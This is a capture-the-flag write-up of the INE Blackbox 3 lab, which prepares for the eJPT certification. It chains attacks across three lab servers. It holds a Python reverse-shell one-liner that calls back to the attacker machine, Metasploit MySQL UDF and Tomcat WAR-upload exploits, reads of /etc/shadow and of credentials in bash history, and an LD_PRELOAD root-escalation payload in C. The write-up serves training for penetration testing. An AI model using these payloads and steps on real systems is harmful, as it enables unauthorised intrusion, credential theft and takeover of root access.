---
title: "[eJPT] INE Blackbox 3"
author: Tri Nguyen
date: 2022-01-12 17:00:00 -0700
categories: [CTF, Write Up]
tags: [ctf, write-up, ine, ejpt]
---

# INE Blackbox 3

- Our machine: 192.246.198.2

## Enumeration 1:

- Target: server1.ine.local = 192.246.198.3

- Nmap: `nmap -sT -P0 192.246.198.3` ---> Port 80 opens.

- Go to the server on our browser you will see a message: `Debugger has turned on.  Please visit /console for the debugger`

- Go to 192.246.198.3/console ---> You can run Python code on this.

- I use payload:

```python3
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.246.198.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

- ** Alternatively ** You can exploit this server using Metasploit's `exploit/multi/http/werkzeug_debug_rce` to gain a direct Meterpreter

- We can't use msfvenom to craft a payload to upgrade our shell. Instead, background the current shell session by using Ctrl+Z. Then search for `shell_to_meterpreter` module. Set the SESSION option to 1 (which is our reverse shell) ---> Run and we receive the upgraded meterpreter shell on session 2.

- Next I tried to move on to the second machine but can't exploit MySQL. Hmm maybe we still have some information in the first machine we can further exploit.

- Some interesting post exploitation module for linux can be found here https://www.infosecmatter.com/post-exploitation-metasploit-modules-reference/. I used: (please use more if you're actually exploiting targets)

```
post/linux/gather/enum_system	
post/linux/gather/enum_users_history	
```

- Nothing interesting in enum_system, you can see a bunch of users.

- When enumerating user history, notice that we can see user history of user `auditor`:

```
[+] bash history for auditor stored in /root/.msf4/loot/20220113024628_default_192.246.198.3_linux.enum.users_769960.txt
```

- Let's have a look. If you look through the log, there are some interesting information:

```
mysql -h 192.246.198.4 -u root -pfArFLP29UySm4bZj
bin/mysqladmin -u root password 'new-password'
```

- Hey, 192.246.198.4 is our second target! And with a Nmap scan, it's only a database server. Let's connect to it using `root:pfArFLP29UySm4bZj`

# Enumeration 2

- I tried manually enumerating this mysql server but nothing prevails. 

- Looking into exploiting with Metasploit to somehow gain a shell.. Hmm.

- Some failed attempts but eventually you need to use this module:

```
22  exploit/multi/mysql/mysql_udf_payload  2009-01-16  excellent  No   Oracle MySQL UDF Payload Execution
```

```
Module options (exploit/multi/mysql/mysql_udf_payload):

   Name              Current Setting   Required  Description
   ----              ---------------   --------  -----------
   FORCE_UDF_UPLOAD  true              no        Always attempt to install a sys_exec() mysql.function.
   PASSWORD          fArFLP29UySm4bZj  no        The password for the specified username
   RHOSTS            server2.ine.local yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             3306              yes       The target port (TCP)
   SRVHOST           0.0.0.0           yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT           8080              yes       The local port to listen on.
   SSL               false             no        Negotiate SSL for incoming connections
   SSLCert                             no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                             no        The URI to use for this exploit (default is random)
   USERNAME          root              no        The username to authenticate as


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.246.198.2    yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux
```

- Actually my Hera lab instance failed and giving weird bug so I refreshed it. 

- ACTUALLY I noticed the correct credential should be `fArFLP29UySm4bZj` without the first letter `p`....

- We FOUND the flag in /root/flag.txt: `4c537c0dfd18bafdcd59f53c7015550e`

# Enumeration 3

- Nmap-ing server3.ine.local:

```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

- Let's go to our browser to have a look. Dirb this webserver!

```
---- Scanning URL: http://server3.ine.local:8080/ ----
+ http://server3.ine.local:8080/docs (CODE:302|SIZE:0)                         
+ http://server3.ine.local:8080/examples (CODE:302|SIZE:0)                     
+ http://server3.ine.local:8080/host-manager (CODE:302|SIZE:0)                 
+ http://server3.ine.local:8080/index.html (CODE:200|SIZE:262)                 
+ http://server3.ine.local:8080/manager (CODE:302|SIZE:0)
```

- Go to docs we foundout they are using `tomcat 8.0.53`. I tried using `exploit/multi/http/tomcat_jsp_upload_bypass` but it wasn't working.

- Next I use `auxiliary/scanner/http/tomcat_mgr_login` set RHOSTS to `server3.ine.local`.

- Found the credentials of `tomcat:s3cret`

- Now we exploit the WAR upload function of Tomcat Manager. We use `exploit/multi/http/tomcat_mgr_upload`:

```
Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting    Required  Description
   ----          ---------------    --------  -----------
   HttpPassword  s3cret             no        The password for the specified username
   HttpUsername  tomcat             no        The username to authenticate as
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        server3.ine.local  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         8080               yes       The target port (TCP)
   SSL           false              no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager           yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                            no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.246.198.2    yes       The listen address (an interface may be specified)
   LPORT  7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal
```

- FLAG1 is at /opt/tomcat: `EBCFE35ACC27E0EA91CF3A5AB600BABE`

- cat /etc/shadow gives us: `robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::`

- Enumerating the tomcat's `conf` folder we can see `conf.tar.gz`. `tar -xf conf.tar.gz; cd conf; cat tomcat-users.xml` we can see robert's password. (OR we could have crack the password hash)

- `robert:robert@1234567890!@#`

- Now we ssh to the machine! FLAG2: `EC2986081E84BB845541D5CC0BEE13B3`

- We spawn a TTY shell: `python -c 'import pty; pty.spawn("/bin/sh")'`

- By using `sudo -l` we know that robert can use `ls` as root. `ls /root` shows that there is a third flag FLAG3

- Also `env_keep+=LD_PRELOAD` is present! Time to escalate some privilege.

- Write shell.c with vim with the following content:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

- Then compile it using: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

- Finally: `sudo LD_PRELOAD=/home/robert/shell.so ls`

- FLAG3: `560648FC63F090A8CF776326DC13FAC7`
